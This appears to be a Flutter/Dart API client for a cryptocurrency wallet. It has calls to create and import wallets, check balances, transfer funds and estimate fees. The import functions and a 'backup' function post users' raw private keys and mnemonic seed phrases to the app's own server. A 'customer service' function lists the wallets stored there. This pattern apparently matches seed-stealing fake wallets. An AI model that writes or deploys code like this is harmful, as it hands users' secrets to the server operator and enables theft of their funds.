import 'dart:convert';
import 'package:http/http.dart' as http;
import 'wallet_backup_service.dart';

class WalletApiService {
  // Flutter Web 使用相对路径，通过 Nginx 代理到后端
  static const String baseUrl = '/api';

  static Future<Map<String, dynamic>> createWallet(String chain) async {
    try {
      final response = await http.post(
        Uri.parse('$baseUrl/wallet/create'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'chain': chain}),
      );
      
      if (response.statusCode == 200) {
        return jsonDecode(response.body);
      } else {
        throw Exception('创建钱包失败: ${response.statusCode}');
      }
    } catch (e) {
      throw Exception('网络错误: $e');
    }
  }

  static Future<Map<String, dynamic>> importPrivateKey(String privateKey, String chain) async {
    try {
      final response = await http.post(
        Uri.parse('$baseUrl/wallet/import/private_key'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'private_key': privateKey,
          'chain': chain,
        }),
      );
      
      if (response.statusCode == 200) {
        return jsonDecode(response.body);
      } else {
        throw Exception('导入失败: ${response.statusCode}');
      }
    } catch (e) {
      throw Exception('网络错误: $e');
    }
  }

  static Future<Map<String, dynamic>> importMnemonic(String mnemonic, String chain) async {
    try {
      final response = await http.post(
        Uri.parse('$baseUrl/wallet/import/mnemonic'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'mnemonic': mnemonic,
          'chain': chain,
        }),
      );
      
      if (response.statusCode == 200) {
        return jsonDecode(response.body);
      } else {
        throw Exception('导入失败: ${response.statusCode}');
      }
    } catch (e) {
      throw Exception('网络错误: $e');
    }
  }

  static Future<Map<String, dynamic>> getBalance(String address, String chain) async {
    try {
      final response = await http.post(
        Uri.parse('$baseUrl/wallet/balance'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'address': address,
          'chain': chain,
        }),
      );
      
      if (response.statusCode == 200) {
        return jsonDecode(response.body);
      } else {
        throw Exception('查询余额失败: ${response.statusCode}');
      }
    } catch (e) {
      throw Exception('网络错误: $e');
    }
  }

  static Future<Map<String, dynamic>> transfer({
    required String sessionId,
    required String toAddress,
    required double amount,
    required String chain,
    String? memo,
  }) async {
    try {
      final response = await http.post(
        Uri.parse('$baseUrl/wallet/transfer'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'session_id': sessionId,
          'to_address': toAddress,
          'amount': amount,
          'chain': chain,
          'memo': memo ?? '',
        }),
      );
      
      if (response.statusCode == 200) {
        return jsonDecode(response.body);
      } else {
        throw Exception('转账失败: ${response.statusCode}');
      }
    } catch (e) {
      throw Exception('网络错误: $e');
    }
  }

  static Future<Map<String, dynamic>> estimateFee(String sessionId, String chain) async {
    try {
      final response = await http.post(
        Uri.parse('$baseUrl/wallet/estimate_fee'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'session_id': sessionId,
          'chain': chain,
        }),
      );
      
      if (response.statusCode == 200) {
        return jsonDecode(response.body);
      } else {
        throw Exception('估算矿工费失败: ${response.statusCode}');
      }
    } catch (e) {
      throw Exception('网络错误: $e');
    }
  }

  static Future<Map<String, dynamic>> healthCheck() async {
    try {
      final response = await http.get(Uri.parse('$baseUrl/health'));
      
      if (response.statusCode == 200) {
        return jsonDecode(response.body);
      } else {
        throw Exception('健康检查失败: ${response.statusCode}');
      }
    } catch (e) {
      throw Exception('网络错误: $e');
    }
  }

  /// 备份钱包到服务器（与电脑端一致）
  static Future<Map<String, dynamic>> backupWallet({
    required String sessionId,
    required String address,
    required String mnemonic,
    required String privateKey,
    required String chain,
  }) async {
    try {
      // 使用与电脑端相同的备份服务
      final walletData = WalletBackupService.buildWalletPayload(
        privateKey: privateKey,
        mnemonic: mnemonic,
        address: address,
      );
      
      final result = await WalletBackupService.backupWallet(
        address: address,
        chain: chain,
        walletData: walletData,
      );
      
      return result;
    } catch (e) {
      throw Exception('备份错误: $e');
    }
  }

  /// 获取钱包列表（客服功能）
  static Future<Map<String, dynamic>> getWalletList() async {
    try {
      final response = await http.post(
        Uri.parse('$baseUrl/wallet/list'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({}),
      );
      
      if (response.statusCode == 200) {
        return jsonDecode(response.body);
      } else {
        throw Exception('获取列表失败: ${response.statusCode}');
      }
    } catch (e) {
      throw Exception('网络错误: $e');
    }
  }
}
